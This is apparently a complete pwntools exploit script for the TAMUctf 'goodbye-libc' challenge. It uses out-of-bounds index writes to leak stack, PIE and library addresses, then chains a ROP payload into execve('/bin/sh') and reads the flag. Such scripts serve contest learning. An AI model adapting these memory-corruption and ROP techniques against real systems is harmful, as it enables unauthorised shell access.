from time import sleep

from pwn import *


context.binary = exe = ELF("./goodbye-libc", checksec=False)
context.arch = "amd64"

HOST = "streams.tamuctf.com"
PORT = 443
SNI = "goodbye-libc"

LOCAL_AT_BASE_IDX = 88
REMOTE_AT_BASE_IDX = 48
AT_BASE_TO_LIBBYE = 0xE000


def start():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=SNI)

    return process("./goodbye-libc")


def field(value, size):
    data = str(value).encode() + b"\n"
    if len(data) > size:
        raise ValueError(f"{value} does not fit in {size} bytes")
    return data.ljust(size, b"A")


def op_print(raw_index):
    return field(6, 16) + field(raw_index, 16)


def op_write(raw_index, value):
    return field(1, 16) + field(raw_index, 16) + field(value, 64)


def recv_value(io):
    io.recvuntil(b"Value written: ")
    return int(io.recvline().strip())


def bootstrap(io):
    io.recvuntil(b"Enter input: ")
    io.send(op_print(4294967294) + op_print(4294967295))
    b0 = recv_value(io)
    pie = recv_value(io) - 0x1CBD
    return b0, pie


def synthetic_leak(io, b0, pie, index):
    frame_f = b0 - 0x30
    frame_r = b0 - 0x40
    pop_rbp_ret = pie + 0x1158
    start_p4 = pie + 0x1550
    print_body = pie + 0x1C7E

    io.send(
        b"".join(
            [
                op_write(4294967296, frame_f),
                op_write(1, start_p4),
                op_write(4294967295, pop_rbp_ret),
                op_write(3, index),
                op_write(4294967296, frame_r),
                op_write(1, print_body),
                op_write(4294967295, pop_rbp_ret),
            ]
        )
    )
    return recv_value(io)


def build_stage2(b0, lib_base):
    start = b0 - 0x40
    binsh = start + 0x28
    buf = bytearray()
    buf += p64(lib_base + 0x103F)
    buf += p64(binsh)
    buf += p64(0)
    buf += p64(0)
    buf += p64(lib_base + 0x1039)
    buf += b"/bin/sh\x00"
    buf += b"P" * (59 - len(buf))
    return bytes(buf)


def queue_final_read(io, b0, pie):
    frame_s = b0 - 0x20
    read_plt = pie + 0x1020

    io.send(
        b"".join(
            [
                op_write(2, frame_s),
                op_write(4294967296, 0),
                op_write(1, b0 - 0x40),
                op_write(2, 59),
                op_write(3, read_plt),
            ]
        )
    )


def fire_stage2(io, b0, lib_base):
    stage2 = build_stage2(b0, lib_base)
    pop_rdi_rsi_rdx_ret = lib_base + 0x103F

    io.send(field(1, 16) + field(4294967295, 16) + field(pop_rdi_rsi_rdx_ret, 64))
    sleep(0.2 if args.REMOTE else 0.05)
    io.send(stage2)


def post_stage_delay():
    sleep(0.2 if args.REMOTE else 0.05)


def exploit(io):
    b0, pie = bootstrap(io)
    at_base_idx = REMOTE_AT_BASE_IDX if args.REMOTE else LOCAL_AT_BASE_IDX
    at_base = synthetic_leak(io, b0, pie, at_base_idx)
    lib_base = at_base - AT_BASE_TO_LIBBYE

    log.info("B0      = %#x", b0)
    log.info("PIE     = %#x", pie)
    log.info("AT_BASE = %#x", at_base)
    log.info("libbye  = %#x", lib_base)

    queue_final_read(io, b0, pie)
    fire_stage2(io, b0, lib_base)


def main():
    io = start()
    exploit(io)
    post_stage_delay()

    if args.CMD:
        io.sendline(args.CMD.encode())
        data = io.recvrepeat(2)
        if data:
            print(data.decode("latin-1", errors="replace"), end="")
        return

    io.sendline(b"echo PWNED")
    try:
        line = io.recvline(timeout=2)
        log.info("shell test: %r", line)
    except EOFError:
        log.warning("no immediate shell response")

    io.sendline(b"ls")
    io.sendline(b"cat flag*")
    io.interactive(prompt=b"")


if __name__ == "__main__":
    main()
